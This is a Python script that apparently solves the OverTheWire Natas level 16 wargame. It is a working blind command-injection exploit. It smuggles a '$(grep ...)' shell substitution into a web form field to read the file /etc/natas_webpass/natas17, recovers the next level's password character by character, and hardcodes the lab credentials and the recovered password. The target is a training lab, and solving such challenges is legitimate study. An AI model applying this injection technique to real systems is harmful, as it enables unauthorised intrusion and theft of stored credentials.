import requests
import string
import re

url = 'http://natas16.natas.labs.overthewire.org/'
auth = requests.auth.HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

password = ''
for i in range(32):
    for j in string.ascii_letters + string.digits:
        response = requests.post(url, auth=auth, data={'submit':'submit','needle':'pineapples$(grep ^' + (password+j) + ' /etc/natas_webpass/natas17)'})
        if 'pineapples' not in response.text:
            password += j
            print(password)

# 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

